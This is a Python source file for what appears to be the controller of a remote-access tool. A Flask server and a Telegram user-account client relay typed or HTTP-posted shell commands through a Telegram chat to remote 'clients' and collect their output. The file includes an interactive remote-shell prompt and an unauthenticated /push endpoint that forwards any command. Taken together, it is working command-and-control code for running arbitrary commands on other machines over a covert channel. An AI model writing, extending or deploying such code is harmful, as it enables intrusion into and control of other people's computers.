from flask import Flask, request, jsonify
from telethon import TelegramClient
import threading
import asyncio
import os
import time
import uuid
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)

# ─────────────────────────────────────────
# Config
# ─────────────────────────────────────────
API_ID       = int(os.getenv("API_ID"))
API_HASH     = os.getenv("API_HASH")
PHONE        = os.getenv("PHONE")
CHAT_ID      = int(os.getenv("CHAT_ID"))

pending_results = {}

# ─────────────────────────────────────────
# Telethon setup
# ─────────────────────────────────────────
telethon_loop = asyncio.new_event_loop()
user_client   = TelegramClient("server_session", API_ID, API_HASH)

async def _start_client():
    await user_client.start(phone=PHONE)
    print("✅ Telethon user client connected!")

def start_telethon():
    asyncio.set_event_loop(telethon_loop)
    telethon_loop.run_until_complete(_start_client())
    telethon_loop.run_forever()

telethon_thread = threading.Thread(target=start_telethon, daemon=True)
telethon_thread.start()
time.sleep(3)

def send_as_user(text: str):
    future = asyncio.run_coroutine_threadsafe(
        user_client.send_message(CHAT_ID, text),
        telethon_loop
    )
    future.result(timeout=10)

# ─────────────────────────────────────────
# Telethon polling — reads bot messages too
# ─────────────────────────────────────────
async def _poll_telethon():
    print("🔄 Telethon polling loop started...")
    last_seen_id = None

    while True:
        try:
            messages = await user_client.get_messages(CHAT_ID, limit=10)

            for msg in reversed(messages):  # oldest first
                if last_seen_id is not None and msg.id <= last_seen_id:
                    continue

                last_seen_id = msg.id
                text = msg.text or ""

                if not text:
                    continue

                if text.startswith("RESULT|"):
                    parts = text.split("|", 2)
                    if len(parts) == 3:
                        _, instruction_id, output = parts
                        if instruction_id in pending_results:
                            print(f"📬 Got result for [{instruction_id}]")
                            pending_results[instruction_id] = output

        except Exception as e:
            print(f"Telethon polling error: {e}")

        await asyncio.sleep(1)  # check every second

def poll_for_results():
    asyncio.run_coroutine_threadsafe(_poll_telethon(), telethon_loop)

# ─────────────────────────────────────────
# Core: send command and wait for result
# ─────────────────────────────────────────
def send_command(command: str) -> dict:
    instruction_id = str(uuid.uuid4())[:8]
    pending_results[instruction_id] = None

    send_as_user(f"INSTRUCTION|{instruction_id}|{command}")
    print(f"📤 [{instruction_id}] $ {command}")

    timeout = 30
    waited  = 0
    while waited < timeout:
        result = pending_results.get(instruction_id)
        if result is not None:
            del pending_results[instruction_id]
            return {"ok": True, "id": instruction_id, "result": result}
        time.sleep(0.5)
        waited += 0.5

    del pending_results[instruction_id]
    return {"ok": False, "id": instruction_id, "result": "❌ Timeout — no response from client"}

# ─────────────────────────────────────────
# Flask routes
# ─────────────────────────────────────────
@app.route("/push", methods=["POST"])
def push_instruction():
    data = request.get_json()
    if not data or "instruction" not in data:
        return jsonify({"error": "missing 'instruction' field"}), 400
    result = send_command(data["instruction"])
    return jsonify(result)

@app.route("/health", methods=["GET"])
def health():
    return jsonify({"status": "running", "pending": len(pending_results)})

# ─────────────────────────────────────────
# Interactive shell
# ─────────────────────────────────────────
def interactive_shell():
    time.sleep(4)
    print("\n" + "="*50)
    print("🖥️  REMOTE SHELL — type commands to execute on client")
    print("    Type 'exit' to quit")
    print("="*50 + "\n")

    while True:
        try:
            cmd = input("shell> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n👋 Exiting.")
            break

        if not cmd:
            continue

        if cmd.lower() == "exit":
            print("👋 Goodbye!")
            os._exit(0)

        result = send_command(cmd)
        print(f"\n📥 Output:\n{result['result']}\n")

# ─────────────────────────────────────────
# Start
# ─────────────────────────────────────────
if __name__ == "__main__":
    import os

    # Start Telethon polling inside the Telethon loop
    poll_for_results()

    # Start Flask in background thread
    threading.Thread(
        target=lambda: app.run(debug=False, port=5000),
        daemon=True
    ).start()

    # Interactive shell in main thread
    interactive_shell()
